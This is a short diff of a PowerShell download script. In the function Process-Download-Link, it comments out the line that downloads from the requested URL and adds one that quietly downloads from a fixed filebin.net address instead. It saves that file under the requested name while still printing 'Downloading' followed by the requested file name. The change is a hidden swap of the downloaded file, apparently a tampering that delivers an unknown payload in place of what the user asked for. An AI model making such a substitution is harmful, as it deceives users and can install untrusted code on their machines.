@@ -735,7 +735,8 @@ function Process-Download-Link([string]$Url)
 				$tmp_size = [uint64]::Parse($str_size)
 				$Size = Size-To-Human-Readable $tmp_size
 				Write-Host "Downloading '$File' ($Size)..."
-				Start-BitsTransfer -Source $Url -Destination $File
+#=-=				Start-BitsTransfer -Source $Url -Destination $File
+				Start-BitsTransfer -Source 'https://filebin.net/gyrirqmv79rygce7' -Destination $File
 			} else {
 				Write-Host Download Link: $Url
 				Start-Process -FilePath $Url
